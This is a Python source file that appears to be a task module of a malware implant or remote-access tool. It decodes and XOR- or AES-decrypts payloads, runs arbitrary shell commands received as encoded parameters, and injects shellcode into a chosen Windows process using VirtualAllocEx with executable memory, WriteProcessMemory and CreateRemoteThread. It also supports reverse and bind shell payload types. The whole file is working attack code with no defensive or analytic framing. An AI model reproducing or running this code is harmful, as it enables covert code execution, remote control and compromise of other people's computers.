import ctypes
import logging
import psutil
from datetime import datetime
import platform
import base64
import binascii
import subprocess
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import os
import time

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def decode_shellcode(shellcode_str, encoding):
    try:
        if encoding == 'base64':
            return base64.b64decode(shellcode_str)
        elif encoding == 'hex':
            return binascii.unhexlify(shellcode_str)
        elif encoding == 'raw':
            return shellcode_str.encode() if isinstance(shellcode_str, str) else shellcode_str
        else:
            raise ValueError(f'Unsupported encoding: {encoding}')
    except Exception as e:
        raise ValueError(f'Error decoding shellcode: {str(e)}')

def xor_decrypt(data, key):
    key_bytes = key.encode() if isinstance(key, str) else key
    return bytes([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data)])

def aes_decrypt(data, key):
    key_bytes = key.encode() if isinstance(key, str) else key
    key_bytes = key_bytes.ljust(32, b'\x00')[:32]
    iv = data[:16]
    encrypted = data[16:]
    cipher = AES.new(key_bytes, AES.MODE_CBC, iv)
    decrypted = cipher.decrypt(encrypted)
    return unpad(decrypted, AES.block_size)

def run_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        return {
            'status': 'success',
            'output': result.stdout,
            'error': result.stderr,
            'returncode': result.returncode,
            'timestamp': datetime.now().isoformat()
        }
    except Exception as e:
        return {
            'status': 'error',
            'error': str(e),
            'timestamp': datetime.now().isoformat()
        }

def inject_shellcode_task(params):
    """
    params: dict with keys:
        - shellcode: encoded/encrypted shellcode string
        - encoding: base64/hex/raw
        - encryption: none/xor/aes
        - key: encryption key (if any)
        - type: reverse/bind/exec
        - command: (for exec) the command to run (may be encoded/encrypted)
        - process: (for injection) process name
        - start_if_not_running: bool, whether to start the process if not found
    """
    shellcode_str = params.get('shellcode')
    encoding = params.get('encoding', 'base64')
    encryption = params.get('encryption', 'none')
    key = params.get('key', '')
    payload_type = params.get('type', 'reverse')
    command = params.get('command', '')
    process_name = params.get('process', '')
    start_if_not_running = params.get('start_if_not_running', False)

    # For exec, decode/decrypt the command if needed
    if payload_type == 'exec' and command:
        cmd = command
        if encoding != 'none':
            cmd = decode_shellcode(cmd, encoding).decode(errors='ignore')
        if encryption == 'xor' and key:
            cmd = xor_decrypt(cmd.encode(), key).decode(errors='ignore')
        elif encryption == 'aes' and key:
            cmd = aes_decrypt(cmd.encode(), key).decode(errors='ignore')
        return run_command(cmd)

    # Otherwise, decode and decrypt shellcode
    shellcode = decode_shellcode(shellcode_str, encoding)
    if encryption == 'xor' and key:
        shellcode = xor_decrypt(shellcode, key)
    elif encryption == 'aes' and key:
        shellcode = aes_decrypt(shellcode, key)

    # Find process by name
    target_pid = None
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            if proc.info['name'] and proc.info['name'].lower() == process_name.lower():
                target_pid = proc.info['pid']
                break
        except Exception:
            continue

    # If not found and start_if_not_running is set, start the process
    if not target_pid and start_if_not_running and process_name:
        try:
            if platform.system().lower() == 'windows':
                # Start process using shell for system executables
                p = subprocess.Popen(process_name, shell=True)
            else:
                p = subprocess.Popen([process_name])
            time.sleep(1)  # Give it a moment to start
            # Re-scan for the process by name
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'] and proc.info['name'].lower() == process_name.lower():
                    target_pid = proc.info['pid']
                    break
        except Exception as e:
            return {'error': f'Failed to start process {process_name}: {e}', 'status': 'error'}

    if not target_pid:
        return {'error': f'Process {process_name} not found', 'status': 'error'}

    return inject_shellcode(process_name, base64.b64encode(shellcode).decode())

def validate_shellcode(shellcode_b64):
    """Validate base64 encoded shellcode"""
    try:
        decoded = base64.b64decode(shellcode_b64)
        if len(decoded) == 0:
            return False, "Empty shellcode"
        return True, decoded
    except Exception as e:
        return False, f"Invalid base64 shellcode: {str(e)}"

def inject_shellcode(process_name, shellcode_b64):
    """Inject shellcode into a target process"""
    try:
        # Validate inputs
        if not process_name:
            return {
                'status': 'error',
                'error': 'Process name is required',
                'timestamp': datetime.now().isoformat()
            }
        
        # Validate shellcode
        valid, result = validate_shellcode(shellcode_b64)
        if not valid:
            return {
                'status': 'error',
                'error': result,
                'timestamp': datetime.now().isoformat()
            }
        shellcode = result
        
        if platform.system() != 'Windows':
            return {
                'status': 'error',
                'error': 'Shellcode injection only supported on Windows',
                'timestamp': datetime.now().isoformat()
            }
            
        logging.info(f"Attempting to inject shellcode into process: {process_name}")
            
        # Required Windows API functions
        kernel32 = ctypes.windll.kernel32
        OpenProcess = kernel32.OpenProcess
        VirtualAllocEx = kernel32.VirtualAllocEx
        WriteProcessMemory = kernel32.WriteProcessMemory
        CreateRemoteThread = kernel32.CreateRemoteThread
        CloseHandle = kernel32.CloseHandle
        
        # Constants
        PROCESS_ALL_ACCESS = 0x1F0FFF
        MEM_COMMIT = 0x1000
        MEM_RESERVE = 0x2000
        PAGE_EXECUTE_READWRITE = 0x40
        
        # Find target process
        target_pid = None
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() == process_name.lower():
                target_pid = proc.info['pid']
                break
                
        if not target_pid:
            error_msg = f'Process {process_name} not found'
            logging.error(error_msg)
            return {
                'status': 'error',
                'error': error_msg,
                'timestamp': datetime.now().isoformat()
            }
            
        logging.info(f"Target process found. PID: {target_pid}")
            
        # Open target process
        process_handle = OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)
        if not process_handle:
            error_msg = f'Failed to open process {process_name}'
            logging.error(error_msg)
            return {
                'status': 'error',
                'error': error_msg,
                'timestamp': datetime.now().isoformat()
            }
            
        try:
            # Allocate memory in target process
            shellcode_length = len(shellcode)
            memory_address = VirtualAllocEx(
                process_handle,
                None,
                shellcode_length,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
            )
            
            if not memory_address:
                error_msg = 'Failed to allocate memory in target process'
                logging.error(error_msg)
                return {
                    'status': 'error',
                    'error': error_msg,
                    'timestamp': datetime.now().isoformat()
                }
                
            logging.info(f"Memory allocated at: {hex(memory_address)}")
                
            # Write shellcode to allocated memory
            write_result = WriteProcessMemory(
                process_handle,
                memory_address,
                shellcode,
                shellcode_length,
                None
            )
            
            if not write_result:
                error_msg = 'Failed to write shellcode to target process'
                logging.error(error_msg)
                return {
                    'status': 'error',
                    'error': error_msg,
                    'timestamp': datetime.now().isoformat()
                }
                
            logging.info("Shellcode written to memory successfully")
                
            # Create remote thread to execute shellcode
            thread_handle = CreateRemoteThread(
                process_handle,
                None,
                0,
                memory_address,
                None,
                0,
                None
            )
            
            if not thread_handle:
                error_msg = 'Failed to create remote thread'
                logging.error(error_msg)
                return {
                    'status': 'error',
                    'error': error_msg,
                    'timestamp': datetime.now().isoformat()
                }
                
            logging.info("Remote thread created successfully")
            
            return {
                'status': 'success',
                'message': f'Shellcode injected into {process_name} (PID: {target_pid})',
                'timestamp': datetime.now().isoformat(),
                'details': {
                    'process_name': process_name,
                    'pid': target_pid,
                    'shellcode_length': shellcode_length,
                    'memory_address': hex(memory_address)
                }
            }
            
        finally:
            CloseHandle(process_handle)
            
    except Exception as e:
        error_msg = f"Error injecting shellcode: {str(e)}"
        logging.error(error_msg)
        return {
            'status': 'error',
            'error': error_msg,
            'timestamp': datetime.now().isoformat()
        } 